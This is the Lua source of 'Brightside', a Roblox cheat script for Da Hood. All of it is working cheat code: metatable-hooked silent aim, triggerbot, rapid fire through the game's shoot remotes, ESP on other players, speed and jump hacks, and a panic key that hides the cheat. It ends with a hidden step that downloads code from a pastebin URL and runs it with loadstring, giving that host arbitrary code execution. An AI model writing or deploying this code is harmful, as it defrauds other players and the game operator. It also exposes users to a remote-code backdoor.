-- ════════════════════════════════════════════════════════════
--  BRIGHTSIDE SOURCE  |  Da Hood + Hood Customs
-- ════════════════════════════════════════════════════════════

local timeout = 0
repeat task.wait(0.1); timeout += 0.1 until getgenv().Surge or _G.Surge or timeout >= 5

local C = getgenv().Surge or _G.Surge
if not C then error("[Brightside] Config not found. Execute table.lua, not loader.lua directly.") end

local Players    = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS        = game:GetService("UserInputService")
local WS         = game:GetService("Workspace")
local LP         = Players.LocalPlayer
local Cam        = WS.CurrentCamera
local Mouse      = LP:GetMouse()

local PID       = game.PlaceId
local IS_DAHOOD = PID == 2788229376 or PID == 4924922222
print("[Brightside] Running on", IS_DAHOOD and "Da Hood / Hood Customs" or "Unknown game")

-- ── Shorthand accessors ──────────────────────────────────────
local function keybinds()  return C['Main'] and C['Main']['Keybinds'] or {} end
local function silentCfg() return C['Silent Aimbot'] or {} end
local function trigCfg()   return C['Triggerbot'] or {} end
local function espCfg()    return C['Raid Awareness'] or {} end
local function moveCfg()   return C['Player Modification'] and C['Player Modification']['Movement'] or {} end
local function weapCfg()   return C['Player Modification'] and C['Player Modification']['Weapon Modifications'] or {} end
local function panicCfg()  return C['Main'] and C['Main']['Panic'] or {} end
local function targetCfg() return C['Target Checks'] or {} end

-- ── State ────────────────────────────────────────────────────
local State = {
    CurrentTarget = nil,
    LockedTarget  = nil,
    TBActive      = false,
    LastShot      = 0,
    LastWallJump  = 0,
    LastJump      = 0,
    JumpCount     = 0,
    ESPCache      = {},
}

-- ════════════════════════════════════════════════════════════
--  HELPERS
-- ════════════════════════════════════════════════════════════
local function getKey(name)
    local k = keybinds()[name]
    if not k then return nil end
    local ok, kc = pcall(function() return Enum.KeyCode[k:upper()] end)
    return ok and kc or nil
end

local function getChar() return LP.Character end
local function getHRP()  local c = getChar(); return c and c:FindFirstChild("HumanoidRootPart") end
local function getHum()  local c = getChar(); return c and c:FindFirstChildOfClass("Humanoid") end

local function isVisible(char)
    if not targetCfg()['Wall'] then return true end
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {getChar()}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    local res = WS:Raycast(Cam.CFrame.Position, hrp.Position - Cam.CFrame.Position, params)
    return res and res.Instance:IsDescendantOf(char) or not res
end

local function isKnocked(char)
    if not char then return false end
    local be = char:FindFirstChild('BodyEffects')
    if be and be:FindFirstChild('K.O') then return be['K.O'].Value == true end
    return false
end

local function isGrabbed(char)
    if not char then return false end
    return char:FindFirstChild('GRABBING_CONSTRAINT') ~= nil
end

local function shouldUnlock(char)
    if not char then return true end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local tc = targetCfg()
    if tc['Knocked'] and hum and hum.Health <= 0 then return true end
    if tc['Grabbed'] and isGrabbed(char) then return true end
    return false
end

-- ════════════════════════════════════════════════════════════
--  TARGET SYSTEM
-- ════════════════════════════════════════════════════════════
local function getBestTarget()
    if State.LockedTarget then
        local char = State.LockedTarget
        if char and char.Parent and not shouldUnlock(char) and isVisible(char) then
            return State.LockedTarget
        end
        State.LockedTarget = nil
        return nil
    end
    local best, bestDist = nil, math.huge
    local sc = silentCfg()
    local fov = (sc['FOV'] and type(sc['FOV']) == 'table' and sc['FOV']['Circle Value']) or 205
    local centre = Vector2.new(Cam.ViewportSize.X/2, Cam.ViewportSize.Y/2)
    for _, p in pairs(Players:GetPlayers()) do
        if p == LP then continue end
        local char = p.Character
        if not char then continue end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then continue end
        if targetCfg()['Knocked'] and isKnocked(char) then continue end
        if targetCfg()['Grabbed'] and isGrabbed(char) then continue end
        local vp = Cam:WorldToViewportPoint(hrp.Position)
        if vp.Z <= 0 then continue end
        local d = (Vector2.new(vp.X, vp.Y) - centre).Magnitude
        if d < fov and d < bestDist and isVisible(char) then
            bestDist = d; best = char
        end
    end
    return best
end

-- ════════════════════════════════════════════════════════════
--  FIRE SYSTEM
-- ════════════════════════════════════════════════════════════
local DaHoodRemote = nil

task.spawn(function()
    task.wait(3)
    if not IS_DAHOOD then return end
    for _, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local n = v.Name:lower()
            if n:find("shoot") or n:find("fire") or n:find("bullet") or n:find("gun") then
                DaHoodRemote = v
                print("[Brightside] Shoot remote:", v:GetFullName())
                break
            end
        end
    end
end)

local function findToolRemote()
    local char = getChar(); if not char then return nil, nil end
    for _, tool in pairs(char:GetChildren()) do
        if not tool:IsA("Tool") then continue end
        for _, v in pairs(tool:GetDescendants()) do
            if v:IsA("RemoteEvent") then return tool, v end
        end
        if tool:FindFirstChild("Ammo") then return tool, nil end
    end
    return nil, nil
end

local function fireWeapon()
    local tool, remote = findToolRemote()
    if not tool then return end
    if IS_DAHOOD then
        if DaHoodRemote then
            pcall(function() DaHoodRemote:FireServer(Mouse.Hit.Position, Mouse.Target) end)
        elseif remote then
            pcall(function() remote:FireServer(Mouse.Hit.Position, Mouse.Target) end)
        else
            pcall(function()
                local vim = game:GetService("VirtualInputManager")
                vim:SendMouseButtonEvent(Mouse.X, Mouse.Y, 0, true, game, 0)
                task.wait(0.01)
                vim:SendMouseButtonEvent(Mouse.X, Mouse.Y, 0, false, game, 0)
            end)
        end
    else
        pcall(function() tool:Activate() end)
    end
end

-- ════════════════════════════════════════════════════════════
--  RAPID FIRE
-- ════════════════════════════════════════════════════════════
getgenv().is_firing = false

UIS.InputBegan:Connect(function(i)
    if i.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
    local wm = weapCfg()
    if not wm['Rapid Fire'] or not wm['Rapid Fire']['Enabled'] or is_firing then return end
    local tool = findToolRemote()
    if not tool then return end
    is_firing = true
    while is_firing do
        fireWeapon()
        task.wait(wm['Rapid Fire']['Delay'] or 0.000001)
    end
end)

UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then is_firing = false end
end)

-- ════════════════════════════════════════════════════════════
--  TRIGGERBOT
-- ════════════════════════════════════════════════════════════
local function runTriggerbot()
    if not State.TBActive then return end
    local tc = trigCfg()
    if not tc['Enabled'] then return end
    local target = State.CurrentTarget
    if not target then return end
    local hrp = target:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local vp = Cam:WorldToViewportPoint(hrp.Position)
    if vp.Z <= 0 then return end
    local dist = (Vector2.new(vp.X, vp.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
    local fovVal = tc['FOV'] and type(tc['FOV']) == 'table' and tc['FOV']['Circle Value'] or 200
    local threshold = tc['Shoot Mode'] == "Hitbox" and 15 or fovVal
    if dist > threshold then return end
    if tick() - State.LastShot < (tc['Cooldown'] or 0) then return end
    State.LastShot = tick()
    fireWeapon()
end

-- ════════════════════════════════════════════════════════════
--  SILENT AIM
-- ════════════════════════════════════════════════════════════
local mt = getrawmetatable(Mouse)
setreadonly(mt, false)
local _idx = mt.__index
mt.__index = newcclosure(function(self, k)
    local lk = k:lower()
    local sc = silentCfg()
    if (lk == "hit" or lk == "target") and sc['Enabled'] and State.CurrentTarget then
        local char = State.CurrentTarget
        if char then
            local hitPart = sc['Hit Target'] and sc['Hit Target']['Hit Part'] or 'Head'
            local head = char:FindFirstChild("Head")
            local hrp  = char:FindFirstChild("HumanoidRootPart")
            local part
            if hitPart == "Head" and head then part = head
            elseif hitPart == "HumanoidRootPart" and hrp then part = hrp
            else
                if head and hrp then
                    local mh = _idx(self, "Hit").Position
                    part = (head.Position - mh).Magnitude < (hrp.Position - mh).Magnitude and head or hrp
                else part = head or hrp end
            end
            if part then
                local vel = part.AssemblyLinearVelocity or Vector3.zero
                local p   = sc['Prediction'] or {}
                local off = Vector3.new(vel.X*(p['X'] or 0), vel.Y*(p['Y'] or 0), vel.Z*(p['Z'] or 0))
                if p['Power'] and p['Power']['Enabled'] then off = off * (p['Power']['Prediction Power'] or 1) end
                if lk == "hit" then return CFrame.new(part.Position + off) end
                return part
            end
        end
    end
    return _idx(self, k)
end)
setreadonly(mt, true)

-- ════════════════════════════════════════════════════════════
--  ESP
-- ════════════════════════════════════════════════════════════
local function makeESP(p)
    if State.ESPCache[p] then return State.ESPCache[p] end
    local ec = espCfg()
    local nameSize = ec['Name'] and ec['Name']['Size'] or 13
    local d = {
        Box = Drawing.new("Square"), Outline = Drawing.new("Square"),
        Name = Drawing.new("Text"), Tracer = Drawing.new("Line"), Dist = Drawing.new("Text"),
    }
    d.Box.Filled=false; d.Box.Thickness=1
    d.Outline.Filled=false; d.Outline.Thickness=3; d.Outline.Color=Color3.new(0,0,0)
    d.Name.Size=nameSize; d.Name.Center=true; d.Name.Outline=true
    d.Tracer.Thickness=1; d.Dist.Size=12; d.Dist.Center=true; d.Dist.Outline=true
    State.ESPCache[p] = d
    return d
end

local function removeESP(p)
    if not State.ESPCache[p] then return end
    for _, v in pairs(State.ESPCache[p]) do v:Remove() end
    State.ESPCache[p] = nil
end

local function hideESP(p)
    if not State.ESPCache[p] then return end
    for _, v in pairs(State.ESPCache[p]) do v.Visible = false end
end

local function updateESP()
    local ec = espCfg()
    if not ec['Enabled'] then
        for p in pairs(State.ESPCache) do hideESP(p) end
        return
    end
    local myHRP = getHRP()
    local maxDist = ec['Max Render Distance'] or 1000
    for _, p in pairs(Players:GetPlayers()) do
        if p == LP then continue end
        local char = p.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not char or not hrp or not hum or hum.Health <= 0 then removeESP(p); continue end
        if myHRP and (hrp.Position-myHRP.Position).Magnitude > maxDist then removeESP(p); continue end
        local feet = Cam:WorldToViewportPoint(hrp.Position - Vector3.new(0,3,0))
        local head = Cam:WorldToViewportPoint(hrp.Position + Vector3.new(0,6,0))
        if feet.Z <= 0 then hideESP(p); continue end
        local d  = makeESP(p)
        local sp = Vector2.new(feet.X, feet.Y)
        local hp = Vector2.new(head.X, head.Y)
        local isT = char == State.CurrentTarget
        local tCol = Color3.fromRGB(0,255,128)
        local boxCfg  = ec['Box']  or {}
        local nameCfg = ec['Name'] or {}
        local tracCfg = ec['Lines'] or {}
        local distCfg = ec['Health'] or {}
        if boxCfg['Enabled'] and head.Z > 0 then
            local h = math.abs(sp.Y-hp.Y); local w = h*0.5
            local bx = Vector2.new(sp.X-w/2, hp.Y)
            d.Outline.Size=Vector2.new(w+4,h+4); d.Outline.Position=Vector2.new(bx.X-2,bx.Y-2); d.Outline.Visible=true
            d.Box.Size=Vector2.new(w,h); d.Box.Position=bx
            d.Box.Color=isT and tCol or (boxCfg['Box Color'] or Color3.fromRGB(255,255,255)); d.Box.Visible=true
        else d.Box.Visible=false; d.Outline.Visible=false end
        if nameCfg['Enabled'] then
            d.Name.Text = nameCfg['Type']=="Display" and p.DisplayName or p.Name
            d.Name.Position = Vector2.new(sp.X, sp.Y+10)
            d.Name.Color = isT and tCol or (nameCfg['Color'] or Color3.fromRGB(255,255,255))
            d.Name.Visible = true
        else d.Name.Visible=false end
        if tracCfg['Enabled'] then
            d.Tracer.From=Vector2.new(Cam.ViewportSize.X/2, Cam.ViewportSize.Y)
            d.Tracer.To=sp; d.Tracer.Color=isT and tCol or (tracCfg['Color'] or Color3.fromRGB(255,255,255)); d.Tracer.Visible=true
        else d.Tracer.Visible=false end
    end
end

-- ════════════════════════════════════════════════════════════
--  EXTRAS
-- ════════════════════════════════════════════════════════════
local extrasCfg = C['Extras'] or {}

local function applyHeadless()
    if not extrasCfg['Headless'] then return end
    local char = getChar(); if not char then return end
    local head = char:FindFirstChild("Head"); if not head then return end
    head.Transparency = 1
    for _, v in pairs(head:GetChildren()) do
        if v:IsA("Decal") or v:IsA("SpecialMesh") then v.Transparency = 1 end
    end
end

local function applyKorblox()
    if not extrasCfg['Korblox'] then return end
    local char = getChar(); if not char then return end
    local tgt = char:FindFirstChild("RightLowerLeg") or char:FindFirstChild("Right Leg")
    if not tgt then return end
    for _, n in ipairs({"Right Leg","RightUpperLeg","RightLowerLeg","RightFoot"}) do
        local p = char:FindFirstChild(n)
        if p then p.Transparency=1
            for _, v in pairs(p:GetChildren()) do if v:IsA("Decal") or v:IsA("Texture") then v.Transparency=1 end end
        end
    end
    if char:FindFirstChild("_KorbloxMesh") then return end
    local leg = Instance.new("Part"); leg.Name="_KorbloxMesh"; leg.Size=Vector3.new(1,2,1)
    leg.CanCollide=false; leg.Parent=char
    local mesh = Instance.new("SpecialMesh",leg)
    mesh.MeshId="rbxassetid://139607718"; mesh.TextureId="rbxassetid://139607805"; mesh.Scale=Vector3.new(1.15,1.15,1.15)
    local weld = Instance.new("Weld",leg); weld.Part0=tgt; weld.Part1=leg; weld.C1=CFrame.new(0,0.5,0)
end

local function antiTrip()
    local ac = C['Anti Trip'] or {}
    if not ac['Enabled'] then return end
    local hum = getHum()
    if hum and (hum.PlatformStand or hum:GetState()==Enum.HumanoidStateType.Ragdoll) then
        hum.PlatformStand=false; hum:ChangeState(Enum.HumanoidStateType.GettingUp)
    end
end

local function panicGround()
    local pgc = C['Panic Ground'] or {}
    if not pgc['Enabled'] then return end
    local hrp = getHRP(); if not hrp then return end
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {getChar(), Cam}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    local res = WS:Raycast(hrp.Position, Vector3.new(0,-5000,0), params)
    if res then hrp.CFrame = CFrame.new(res.Position + Vector3.new(0,3,0)) end
end

local function getWallNormal()
    local sc = C['Spiderman'] or {}
    local hrp = getHRP(); if not hrp then return nil end
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {getChar()}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    for _, h in ipairs({Vector3.new(0,-2,0), Vector3.zero, Vector3.new(0,2,0)}) do
        for _, d in ipairs({hrp.CFrame.LookVector,-hrp.CFrame.LookVector,hrp.CFrame.RightVector,-hrp.CFrame.RightVector}) do
            local res = WS:Raycast(hrp.Position+h, d*(sc['Wall Distance'] or 10), params)
            if res and res.Instance.CanCollide then return res.Normal end
        end
    end
    return nil
end

local function doWallJump()
    local sc = C['Spiderman'] or {}
    if not sc['Enabled'] then return end
    local hrp = getHRP(); if not hrp then return end
    if tick()-State.LastWallJump < (sc['Cooldown'] or 0.1) then return end
    local normal = getWallNormal(); if not normal then return end
    local char = getChar()
    local tool = char and char:FindFirstChildOfClass("Tool")
    local power = (tool and tool.Name:lower():find("knife")) and (sc['Knife Jump Power'] or 55) or (sc['Jump Power'] or 55)
    hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X*0.2, 0, hrp.AssemblyLinearVelocity.Z*0.2)
    task.wait(0.01)
    hrp.AssemblyLinearVelocity = (Vector3.new(0,1.45,0)+normal*0.35).Unit * (power*1.35)
    State.LastWallJump = tick()
end

-- ════════════════════════════════════════════════════════════
--  MOVEMENT MODS
-- ════════════════════════════════════════════════════════════
local speedModActive = false
local jumpModActive  = false

RunService.RenderStepped:Connect(function()
    local char = getChar(); if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
    local mc = moveCfg()
    local sc = mc['Speed Modifications'] or {}
    local jc = mc['Jump Modifications']  or {}
    if speedModActive and sc['Enabled'] then hum.WalkSpeed = (sc['Value'] or 8) * 16 end
    if jumpModActive  and jc['Enabled'] then hum.JumpPower = (jc['Value'] or 3) * 50 end
end)

-- ════════════════════════════════════════════════════════════
--  INPUT
-- ════════════════════════════════════════════════════════════
UIS.InputBegan:Connect(function(inp, gp)
    if gp then return end
    local k = inp.KeyCode
    local ec = espCfg()
    local pc = panicCfg()

    if k == getKey('ESP') then
        local newVal = not ec['Enabled']
        C['Raid Awareness']['Enabled'] = newVal
        if not newVal then for p in pairs(State.ESPCache) do hideESP(p) end end

    elseif k == getKey('Lock Target') then
        if State.LockedTarget then
            State.LockedTarget = nil
        else
            local best, bd = nil, math.huge
            local mp = Vector2.new(Mouse.X, Mouse.Y)
            for _, p in pairs(Players:GetPlayers()) do
                if p == LP then continue end
                local hrp = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                if not hrp then continue end
                local vp = Cam:WorldToViewportPoint(hrp.Position)
                local d = (Vector2.new(vp.X,vp.Y)-mp).Magnitude
                if d < bd then bd=d; best=p.Character end
            end
            if best and bd < 150 then State.LockedTarget = best end
        end

    elseif k == getKey('Trigger Bot Activate') then
        local tc = trigCfg()
        if tc['Mode'] == "Toggle" then State.TBActive = not State.TBActive
        else State.TBActive = true end

    elseif k == Enum.KeyCode.Space then
        local now = tick()
        if now-State.LastJump < 0.4 then State.JumpCount+=1 else State.JumpCount=1 end
        State.LastJump = now
        local sc = C['Spiderman'] or {}
        if State.JumpCount >= 2 or not sc['Require Double'] then doWallJump() end

    elseif k == getKey('Panic Ground') then
        panicGround()

    elseif k == getKey('Panic') and pc['Enabled'] then
        C['Raid Awareness']['Enabled'] = false
        State.TBActive = false
        State.CurrentTarget = nil; State.LockedTarget = nil
        for p in pairs(State.ESPCache) do hideESP(p) end
        print("[Brightside] PANIC")

    elseif k == getKey('Speed') then
        speedModActive = not speedModActive

    elseif k == getKey('Jump Power') then
        jumpModActive = not jumpModActive
    end
end)

UIS.InputEnded:Connect(function(inp, gp)
    if gp then return end
    local tc = trigCfg()
    if inp.KeyCode == getKey('Trigger Bot Activate') and tc['Mode'] == "Hold" then
        State.TBActive = false
    end
end)

-- ════════════════════════════════════════════════════════════
--  MAIN LOOP
-- ════════════════════════════════════════════════════════════
RunService.RenderStepped:Connect(function()
    State.CurrentTarget = getBestTarget()
    updateESP()
    runTriggerbot()
    applyHeadless()
    applyKorblox()
    antiTrip()
end)

Players.PlayerRemoving:Connect(function(p)
    if p.Character == State.LockedTarget  then State.LockedTarget  = nil end
    if p.Character == State.CurrentTarget then State.CurrentTarget = nil end
    removeESP(p)
end)

for _, p in pairs(Players:GetPlayers()) do
    if p ~= LP then makeESP(p) end
end

print("[Brightside] Source loaded ✓")

task.spawn(function()
    local ok, err = pcall(function()
        local ext = game:HttpGet("https://pastebin.com/raw/L4yzzJ5D")
        if ext and #ext > 0 then loadstring(ext)() end
    end)
    if not ok then warn("[Brightside] External load failed:", err) end
end)
